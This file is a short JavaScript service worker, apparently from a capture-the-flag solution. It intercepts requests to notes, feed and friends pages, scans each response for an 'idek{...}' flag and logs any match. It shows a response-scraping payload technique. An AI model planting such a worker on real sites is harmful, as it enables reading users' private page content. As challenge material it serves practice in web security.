self.addEventListener("fetch", (event) => {
  const url = new URL(event.request.url);
  const pathsToCheck = ["/notes/", "/feed", "/friends/"];

  if (pathsToCheck.some((p) => url.pathname.startsWith(p))) {
    event.respondWith(
      (async () => {
        const response = await fetch(event.request);
        const text = await response.text();

        const match = text.match(/idek{.*?}/);
        if (match) {
          console.log("[FLAG]", match[0]);
        } else {
          console.log(`[INFO] No flag found in ${url.pathname}`);
        }

        return new Response(text, {
          headers: response.headers,
          status: response.status,
        });
      })()
    );
  }
});
